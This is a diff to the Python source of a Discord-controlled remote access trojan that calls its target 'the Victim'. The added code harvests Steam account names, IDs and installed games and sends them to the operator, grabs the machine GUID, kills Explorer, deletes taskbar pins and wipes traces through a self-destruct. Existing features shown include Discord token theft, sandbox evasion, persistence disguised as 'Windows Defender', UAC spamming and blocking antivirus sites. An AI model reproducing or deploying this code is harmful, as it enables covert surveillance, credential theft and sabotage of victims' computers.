@@ -38,12 +38,25 @@ from discord.ext import commands
 from PIL import Image, ImageTk, ImageGrab
 from datetime import datetime, timedelta
 
+# VARS
+
+AutoSteal = False
+DiscordInjection = False
+AutoSelfDestroy = False
+
+# VARS
+
 os.system("@echo off")
 os.system("cls")
 init()
 print(Fore.GREEN)
 if sys.platform.startswith('win'):
     asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+
+def check_token():
+    if HzzH == "":
+        print(f"{Fore.RED}[ERROR] No Token given on Line 161 in Code!{Fore.GREEN}")
+        input()
 
 def perform_all_checks():
     blacklisted_names = ["johnson", "miller", "malware", "maltest", "currentuser", "sandbox", "virus", "john doe", "test user", "sand box", "wdagutilityaccount"]
@@ -117,10 +130,15 @@ def perform_all_checks():
             exit()
             return "KVM drivers detected"
 
-    return "No VM found!"
+    return f"{Fore.BLUE}[INFO] No VM found!{Fore.GREEN}"
 
-result = perform_all_checks()
+try:
+    result = perform_all_checks()
+except:
+    print(f"[ERROR] Error on VM Check")
+
 print(result)
+
 executor = ThreadPoolExecutor()
 intents = discord.Intents.default()
 intents.messages = True
@@ -162,6 +180,9 @@ bot = commands.Bot(command_prefix="!", intents=intents, help_command=None) # Cha
 
 # DO NOT CHANGE ANYTHING BELOW IF YOU DONT KNOW WHAT YOU ARE DOING
 
+apps_vdf = os.path.join(os.getenv("PROGRAMFILES(X86)"), "Steam", "config", "libraryfolders.vdf")
+acc_vdf = os.path.join(os.getenv("PROGRAMFILES(X86)"), "Steam", "config", "loginusers.vdf")
+steamurl = "https://api.steampowered.com/ISteamApps/GetAppList/v2"
 script_path = os.path.realpath(sys.argv[0])
 autohzzh = os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
 hzzh_path = os.path.join(autohzzh, 'Windows Defender.exe')
@@ -412,10 +433,10 @@ def wait_for_wifi():
     while True:
         try:
             socket.create_connection(("8.8.8.8", 53), timeout=5)
-            print(Fore.GREEN + "Found Wi-Fi" + Fore.RESET)
+            print(Fore.GREEN + "[SUCCESS] Found Wi-Fi" + Fore.RESET)
             return
         except (socket.timeout, socket.error):
-            print(Fore.YELLOW + "Waiting for Wi-Fi" + Fore.RESET)
+            print(Fore.BLUE + "[INFO] Waiting for Wi-Fi" + Fore.GREEN)
             time.sleep(5)
 
 @bot.event
@@ -921,6 +942,60 @@ def reverse_mouse_move():
 
         pyautogui.sleep(0.1)
 
+def get_game_name_from_api(app_id):
+    try:
+        response = requests.get(steamurl)
+        if response.status_code == 200:
+            data = response.json()
+            apps = data.get('applist', {}).get('apps', [])
+            for app in apps:
+                if app.get('appid') == app_id:
+                    return app.get('name')
+        else:
+            return f"Error fetching game name from Steam API: {response.status_code}"
+    except Exception as e:
+        return f"Error fetching game name from Steam API: {e}"
+
+def extract_steam_account_data():
+    if not os.path.exists(acc_vdf):
+        return None
+
+    account_data = {}
+    with open(acc_vdf, 'r', encoding='utf-8', errors='ignore') as f:
+        content = f.read()
+
+        pattern = re.compile(r'"(\d+)"\s*\{\s*"AccountName"\s*"([^"]+)"\s*"PersonaName"\s*"([^"]+)"')
+        matches = pattern.findall(content)
+
+        for steam_id, account_name, persona_name in matches:
+            account_data[steam_id] = {
+                "AccountName": account_name,
+                "PersonaName": persona_name
+            }
+
+    return account_data
+
+def extract_steam_games():
+    if not os.path.exists(apps_vdf):
+        return None
+
+    games_data = {}
+    with open(apps_vdf, 'r', encoding='utf-8', errors='ignore') as f:
+        content = f.read()
+
+        pattern = re.compile(r'"(\d+)"\s*"([^"]+)"')
+        matches = pattern.findall(content)
+
+        for game_id_str, game_name in matches:
+            game_id = int(game_id_str)
+            game_name_from_api = get_game_name_from_api(game_id)
+            if game_name_from_api:
+                games_data[game_id] = game_name_from_api
+            else:
+                games_data[game_id] = game_name
+
+    return games_data
+
 @bot.command()
 async def help(ctx):
     embed = discord.Embed(
@@ -976,20 +1051,27 @@ async def help(ctx):
     embed1.add_field(name="!recscreen (sec)", value="Records the screen for a specific number of seconds 🖼️📷", inline=False)
     embed1.add_field(name="!recaudio (sec)", value="Records audio for a specific number of seconds 🎤📷", inline=False)
     embed1.add_field(name="!recwebcam (sec)", value="Records webcam for a specific number of seconds 📷📷", inline=False)
+    embed1.add_field(name="!hwid", value="Get HWID of the PC 🍕🍕", inline=False)
+    embed1.add_field(name="!minimize", value="Simulating win + D press. (Showing Desktop)🖼👩‍💻", inline=False)
+    embed1.add_field(name="!cleartaskbar", value="Clears all icons on the Taskbar ❌👌", inline=False)
+    embed1.add_field(name="!playmp3", value="Plays an attached mp3 file. 🎵🎶", inline=False)
+    embed1.add_field(name="!closeexplorer", value="Closes Explorer (removes taskbar and Desktop) 🤯", inline=False)
+    embed1.add_field(name="!selfdestruct", value="Removes the RAT and all traces! 💣", inline=False)
+    embed1.add_field(name="!steam", value="Gets Steam Account Info and Apps installed. 🍕", inline=False)
     embed1.add_field(name="!tokens", value="Get Discord Tokens 🎁", inline=False)
     # embed1.add_field(name="!browser", value="Get Browser Passwords & more! 🦕🦕", inline=False) Not added rn bc i tried adding for over 6-8 hours or smth and i cant get it to work ;(
-    embed1.add_field(name="!getadmin", value="Gets admin Permissions by spamming UAC prompts 🛠️", inline=False)
-    embed1.add_field(name="", value="", inline=False)
-    embed1.add_field(name="", value="**Admin required Features:**", inline=False)
-    embed1.add_field(name="!taskmgr", value="Disables Task Manager 🎰", inline=False)
-    embed1.add_field(name="!taskmgr_enable", value="Enables Task Manager 🎰", inline=False)
-    embed1.add_field(name="!blocklist", value="Disables the Victim to lookup common AV Sites 🦠", inline=False)
 
     await ctx.send(embed=embed1)
 
     embed2 = discord.Embed(
         color=0x00ff00 
     )
+    embed1.add_field(name="!getadmin", value="Gets admin Permissions by spamming UAC prompts 🛠️", inline=False)
+    embed1.add_field(name="", value="", inline=False)
+    embed1.add_field(name="", value="**Admin required Features:**", inline=False)
+    embed1.add_field(name="!taskmgr", value="Disables Task Manager 🎰", inline=False)
+    embed1.add_field(name="!taskmgr_enable", value="Enables Task Manager 🎰", inline=False)
+    embed2.add_field(name="!blocklist", value="Disables the Victim to lookup common AV Sites 🦠", inline=False)
     embed2.add_field(name="!unblocklist", value="Enables the Victim to lookup common AV Sites 🦠", inline=False)
     embed2.add_field(name="!nostartup", value="Disable Users permissions to look in the Startup Folder 🔒🗂️", inline=False)
     embed2.add_field(name="!nostartup_disable", value="Enables Users permissions to look in the Startup Folder 🔓🗂️", inline=False)
@@ -1008,15 +1090,243 @@ async def help(ctx):
     embed2.add_field(name="!jumpscare", value="loud, scary jumpscare😱🔊", inline=False)
     embed2.add_field(name="!cpufuck", value="Maxes out the CPU usage to 100% ⚡💻", inline=False)
     embed2.add_field(name="!bluescreen", value="Crashes the PC with a BSOD. 💥🖥️", inline=False)
-    embed2.add_field(name="!shaking", value="Makes the mouse shake automaticly 🖱️💥", inline=False)
-    embed2.add_field(name="", value="", inline=False)
-    embed2.add_field(name="", value="**Discord Features:**", inline=False)
-    embed2.add_field(name="!purge (amount)", value="Purges (amount) Chat Messages in Chat 🚮", inline=False)
-    embed2.add_field(name="!recreate (#channel)", value="Deletes and recreates a Channel 🔄", inline=False)
-    embed2.add_field(name="!net", value="Creates / Recreates the Botnet Channel ⚡", inline=False)
-    embed2.add_field(name="", value="Made with ❤ by H-zz-H.", inline=False)
 
     await ctx.send(embed=embed2)
+
+    embed3 = discord.Embed(
+    color=0x00ff00 
+    )
+    embed3.add_field(name="!shaking", value="Makes the mouse shake automaticly 🖱️💥", inline=False)
+    embed3.add_field(name="", value="", inline=False)
+    embed3.add_field(name="", value="**Discord Features:**", inline=False)
+    embed3.add_field(name="!purge (amount)", value="Purges (amount) Chat Messages in Chat 🚮", inline=False)
+    embed3.add_field(name="!recreate (#channel)", value="Deletes and recreates a Channel 🔄", inline=False)
+    embed3.add_field(name="!net", value="Creates / Recreates the Botnet Channel ⚡", inline=False)
+    embed3.add_field(name="", value="Made with ❤ by H-zz-H.", inline=False)
+
+    await ctx.send(embed=embed3)
+
+@bot.command()
+async def minimize(ctx):
+    try:
+        pyautogui.hotkey('win', 'd')
+
+        embed = discord.Embed(
+            title="🖥️ Pressed win + D",
+            description="Successfully simulated win + D.",
+            color=discord.Color.green()
+        )
+    except Exception as e:
+        embed = discord.Embed(
+            title="❌ Failed to press win + D",
+            description=f"Error occurred: `{e}`",
+            color=discord.Color.red()
+        )
+
+    await ctx.send(embed=embed)
+
+@bot.command()
+async def cleartaskbar(ctx):
+    try:
+        taskbar_path = os.path.expandvars(r"%AppData%\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar")
+
+        if not os.path.exists(taskbar_path):
+            embed = discord.Embed(
+                title="❌ Taskbar Path Not Found",
+                description="Could not find the taskbar path.",
+                color=discord.Color.red()
+            )
+            await ctx.send(embed=embed)
+            return
+
+        for filename in os.listdir(taskbar_path):
+            file_path = os.path.join(taskbar_path, filename)
+            try:
+                if os.path.isfile(file_path):
+                    os.remove(file_path)
+            except Exception as e:
+                print(f"Failed to delete {file_path}. Reason: {e}")
+
+        subprocess.run(["taskkill", "/f", "/im", "explorer.exe"], check=True)
+        subprocess.Popen("explorer.exe")
+
+        embed = discord.Embed(
+            title="🗑️ Taskbar Cleared",
+            description="All pinned apps have been removed from the taskbar.",
+            color=discord.Color.green()
+        )
+    except Exception as e:
+        embed = discord.Embed(
+            title="❌ Failed to Clear Taskbar",
+            description=f"Error: `{e}`",
+            color=discord.Color.red()
+        )
+
+    await ctx.send(embed=embed)
+
+@bot.command()
+async def playmp3(ctx):
+    try:
+        if not ctx.message.attachments:
+            embed = discord.Embed(
+                title="❌ No MP3 Attachments Found",
+                description="Please attach MP3 files when using this command.",
+                color=discord.Color.red()
+            )
+            await ctx.send(embed=embed)
+            return
+        
+        downloaded_files = []
+
+        for attachment in ctx.message.attachments:
+            if attachment.filename.lower().endswith(".mp3"):
+                file_path = os.path.join(temp_folder, attachment.filename)
+                await attachment.save(file_path)
+                downloaded_files.append(file_path)
+
+        if not downloaded_files:
+            embed = discord.Embed(
+                title="❌ No MP3 Files",
+                description="No valid MP3 files found in your attachments.",
+                color=discord.Color.red()
+            )
+            await ctx.send(embed=embed)
+            return
+
+        chosen_file = random.choice(downloaded_files)
+
+        os.startfile(chosen_file)
+
+        embed = discord.Embed(
+            title="🎶 Playing Random MP3",
+            description=f"Now playing: `{os.path.basename(chosen_file)}`",
+            color=discord.Color.green()
+        )
+        await ctx.send(embed=embed)
+
+    except Exception as e:
+        embed = discord.Embed(
+            title="❌ Error Playing MP3",
+            description=f"Error: `{e}`",
+            color=discord.Color.red()
+        )
+        await ctx.send(embed=embed)
+
+@bot.command()
+async def closeexplorer(ctx):
+    try:
+        subprocess.run(["taskkill", "/f", "/im", "explorer.exe"], check=True)
+
+        embed = discord.Embed(
+            title="🗿 Explorer Closed",
+            description="`explorer.exe` has been terminated. Taskbar and desktop are gone!",
+            color=discord.Color.dark_red()
+        )
+    except Exception as e:
+        embed = discord.Embed(
+            title="❌ Failed to Close Explorer",
+            description=f"Error occurred: `{e}`",
+            color=discord.Color.red()
+        )
+
+    await ctx.send(embed=embed)
+
+@bot.command()
+async def selfdestruct(ctx):
+    try:
+        embed = discord.Embed(
+            title="💣 Self-Destruct Activated",
+            description="Bot is shutting down and removing files...",
+            color=discord.Color.red()
+        )
+        await ctx.send(embed=embed)
+
+        await bot.close()
+
+        if os.path.exists(hzzh_path):
+            os.remove(hzzh_path)
+
+        if os.path.exists(hzzh_path1):
+            os.remove(hzzh_path1)
+
+        try:
+            registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
+            reg.DeleteValue(registry_key, "Windows Defender")
+            reg.CloseKey(registry_key)
+        except Exception as e:
+            pass
+
+        os.remove(script_path)
+
+    except Exception as e:
+        print(f"Self-destruct failed: {e}")
+    finally:
+        sys.exit(0)
+
+@bot.command()
+async def hwid(ctx):
+    try:
+        result = subprocess.check_output('reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid', shell=True, text=True)
+        hwid = result.split("REG_SZ")[-1].strip()
+
+        embed = discord.Embed(
+            title="🖥️ Victims HWID",
+            description=f"`{hwid}`",
+            color=discord.Color.blurple()
+        )
+
+    except Exception as e:
+        embed = discord.Embed(
+            title="❌ Failed to Fetch HWID",
+            description=f"Error occurred: `{e}`",
+            color=discord.Color.red()
+        )
+
+    await ctx.send(embed=embed)
+
+@bot.command()
+async def steam(ctx):
+    try:
+        account_data = extract_steam_account_data()
+        games_data = extract_steam_games()
+
+        if account_data and games_data:
+            for steam_id, data in account_data.items():
+                embed = discord.Embed(
+                    title=f"Account Name: \n{data['AccountName']}",
+                    description=f"**Personal Name** \n{data['PersonaName']}",
+                    color=discord.Color.green()
+                )
+                
+                embed.add_field(name="Steam ID", value=steam_id, inline=False)
+                
+                game_list = "\n".join(
+                    [f"Game Name: {game_name}" for game_id, game_name in games_data.items()
+                     if game_id not in [1106853685130127918, 0, 2148357644, 1744723744]]
+                )
+                
+                if game_list:
+                    embed.add_field(name="Installed Steam Games", value=game_list, inline=False)
+                else:
+                    embed.add_field(name="Installed Steam Games", value="No valid games found.", inline=False)
+
+                await ctx.send(embed=embed)
+
+        else:
+            embed = discord.Embed(
+                title="❌ No Steam Data Found",
+                description="Could not fetch Steam account or games data.",
+                color=discord.Color.red()
+            )
+            await ctx.send(embed=embed)
+
+    except Exception as e:
+        embed = discord.Embed(
+            title="❌ Failed to Fetch Steam Data",
+            description=f"Error occurred: `{e}`",
+            color=discord.Color.red()
+        )
+        await ctx.send(embed=embed)
 
 @bot.command()
 async def exclude_exe(ctx):
@@ -2846,6 +3156,7 @@ async def web_open(ctx, url):
     )
     await ctx.send(embed=embed)
 
+check_token()
 hzzh()
 hzzhtemp()
 hzzhreg()
